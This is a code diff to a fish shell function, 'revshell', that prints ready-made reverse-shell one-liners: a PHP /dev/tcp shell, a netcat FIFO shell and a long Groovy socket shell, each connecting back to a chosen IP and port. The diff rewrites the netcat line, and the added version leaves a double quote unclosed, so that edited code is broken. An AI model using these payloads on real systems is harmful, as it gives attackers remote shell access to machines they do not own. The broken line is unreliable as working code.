@@ -37,7 +37,7 @@ function revshell --description 'Print reverse-shell one-liners (bash/python/php
     echo ---------------------------------------------
     echo "[+] PHP simple Revshell: <?php echo system(\"0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196\"); ?>"
     echo ---------------------------------------------
-    echo "[+] Netcat FIFO: rm /tmp/wk; mkfifo /tmp/wk; cat /tmp/wk | /bin/bash -i 2>&1 | nc $ip $port"
+    echo "[+] Netcat FIFO: rm -f /tmp/wk; mkfifo /tmp/wk; cat /tmp/wk | /bin/sh -i 2>&1 | nc $ip $port > /tmp/wk
     echo ---------------------------------------------
     echo "[+] Groovy: String host="$ip";int port=$port;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
     echo ---------------------------------------------
